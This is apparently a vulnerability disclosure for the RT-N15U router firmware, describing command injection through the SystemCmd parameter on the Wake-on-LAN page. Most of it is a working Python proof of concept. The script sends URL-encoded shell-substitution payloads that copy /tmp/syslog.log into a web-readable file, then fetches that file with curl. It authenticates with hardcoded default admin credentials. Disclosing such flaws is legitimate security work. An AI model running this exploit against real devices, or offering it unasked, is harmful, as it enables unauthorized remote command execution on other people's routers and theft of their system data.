Router model: FW_RT_N15U

Firmware version: 3.0.0.4.376_3754

# Vulnerability introduction

The sub_41F360t function is not strictly filtered, allowing users to construct malicious code under the sys_scrip function, execute the malicious code by accessing the Main_WOL_Content.asp web page, and execute commands remotely.

# Vulnerability analysis

The vulnerability lies in the Main_WOL_Content.asp function page of the sub_41F360 function.

![image](https://github.com/user-attachments/assets/084303d0-5735-4e6c-91f5-4ccb9c7fa1a9)

![image](https://github.com/user-attachments/assets/a38029a8-8569-4bc0-8239-c6d2e630792f)

Finally, execute the sys_script function, where SystemCmd is directly spliced ​​into the string.

![image](https://github.com/user-attachments/assets/d9d4673c-e930-40ba-8ab0-f517745edfb4)

You can construct payload = SystemCmd=ether-wake+$(cmd) # for exploitation

# POC

![image](https://github.com/user-attachments/assets/d64e5414-8254-45b0-99cd-9d5b60081f62)



```python
import requests
import subprocess
burp0_url = "http://192.168.1.1:80/apply.cgi?current_page=Main_WOL_Content.asp&next_page=Main_WOL_Content.asp&group_id=&modified=0&action_mode=+Refresh+&action_script=&action_wait=&first_time=&preferred_lang=CN&SystemCmd=ether%2dwake+%24%28cat+%2Ftmp%2Fsyslog.log%3E+tweety.asp+%29%23&firmver=3.0.0.4&destIP=%24%28cat+%2Ftmp%2Fsyslog.log%3E+tweety.asp+%29%23&wollist_deviceName=%24%28cat+%2Ftmp%2Fsyslog.log%3E+tweety.asp+%29%23&wollist_macAddr=%24%28cat+%2Ftmp%2Fsyslog.log%3E+tweety.asp+%29%23"


burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.58 Safari/537.36", 
                 "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", 
                 "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8,en-US;q=0.7", "Accept-Encoding": "gzip, deflate, br", 
                 "Authorization": "Basic YWRtaW46YWRtaW4=", 
                 "Connection": "close", 
                 "Referer":"http://192.168.1.1/Main_WOL_Content.asp", 
                 "Upgrade-Insecure-Requests": "1"}

session = requests.Session()

session.get(burp0_url, headers=burp0_headers)
burp1_url = "http://192.168.1.1:80/Main_WOL_Content.asp"
burp1_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.58 Safari/537.36", 
                 "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", 
                 "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8,en-US;q=0.7", "Accept-Encoding": "gzip, deflate, br", 
                 "Authorization": "Basic YWRtaW46YWRtaW4=", 
                 "Connection": "close",  
                 "Referer": "http://192.168.1.1:80/apply.cgi?current_page=Main_WOL_Content.asp&next_page=Main_WOL_Content.asp&group_id=&modified=0&action_mode=+Refresh+&action_script=&action_wait=&first_time=&preferred_lang=CN&SystemCmd=ether%2dwake+%24%28cat+%2Ftmp%2Fsyslog.log%3E+tweety.asp+%29%23&firmver=3.0.0.4&destIP=%24%28cat+%2Ftmp%2Fsyslog.log%3E+tweety.asp+%29%23&wollist_deviceName=%24%28cat+%2Ftmp%2Fsyslog.log%3E+tweety.asp+%29%23&wollist_macAddr=%24%28cat+%2Ftmp%2Fsyslog.log%3E+tweety.asp+%29%23"
, 
    "Upgrade-Insecure-Requests": "1"}
session.get(burp1_url, headers=burp1_headers)

def execute_shell_command(command):
    try:
        result = subprocess.run(command, shell=True, check=True,
        stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
        return result.stdout.strip()
    except subprocess.CalledProcessError as e:
        return f"Error executing command: {e}"
    except Exception as e:
        return f"Error: {e}"

command = "curl http://192.168.1.1/tweety.asp -H 'Authorization: Basic YWRtaW46YWRtaW4='"
output = execute_shell_command(command)
print("Command output:")
print(output)
```
